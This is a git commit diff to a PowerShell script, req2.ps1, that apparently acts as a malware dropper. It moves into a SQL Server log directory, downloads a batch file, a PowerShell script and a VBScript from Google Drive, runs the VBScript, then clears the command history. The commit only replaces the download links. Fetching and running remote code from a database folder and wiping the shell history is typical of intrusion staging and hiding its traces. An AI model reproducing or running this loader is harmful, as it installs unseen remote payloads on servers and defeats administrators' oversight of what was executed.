a8db9b63ba04d4ee88fdae37b8a6ac3e8826aefa
dyaa1997dyaa <119899779+dyaa1997dyaa@users.noreply.github.com>
2024-10-24 00:34:01 -0700

    Update req2.ps1

--- req2.ps1
+++ req2.ps1
@@ -1,8 +1,8 @@
 cd "D:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=11M4wy0arcs75l79I_ykCJUUiT0yQD8k6" -outfile "win64.bat"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1JEyVqk9NEtt1ABMY6fIuAoQOfwiEaW0b" -outfile "user.ps1"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ZTZxvMinJVQJBwa4gRCxdGnz4eo_MUDv" -outfile "win64.bat"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=12qElj9lDxMST2t7EsKmljDDa6AR9h_JT" -outfile "user.ps1"
 cd "D:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=118vZIW6-WC1m1jNVkt7u5uqaB0bJ_QCi" -outfile "startup.vbs"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1TiujQ7R1q7EaTFaUXbOkdCQuwuwksriP" -outfile "startup.vbs"
 start startup.vbs
 Clear-History
 exit
